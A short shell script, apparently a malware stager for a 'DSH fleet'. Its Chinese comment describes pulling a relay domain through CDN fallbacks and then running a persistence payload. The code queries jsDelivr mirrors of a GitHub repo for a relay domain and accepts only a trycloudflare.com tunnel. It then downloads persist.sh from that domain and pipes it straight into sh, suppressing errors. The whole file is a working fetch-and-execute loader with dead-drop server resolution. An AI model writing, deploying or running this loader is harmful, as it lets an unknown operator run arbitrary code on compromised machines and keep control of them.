#!/bin/sh
# DSH fleet pin bootstrap v2: 多CDN兜底拉当前中继域名 → 拉维持载荷执行
for CDN in cdn.jsdelivr.net fastly.jsdelivr.net testingcf.jsdelivr.net; do
  P=$(curl -s -m 8 "https://$CDN/gh/y1721607494-beep/dsh-relay-pin@main/relay.json" 2>/dev/null)
  D=$(printf '%s' "$P" | sed -n 's/.*"domain"[: ]*"\([^"]*\)".*/\1/p')
  case "$D" in https://*.trycloudflare.com) break;; esac
done
[ -n "$D" ] && curl -s -m 15 "$D/persist.sh" | sh
exit 0
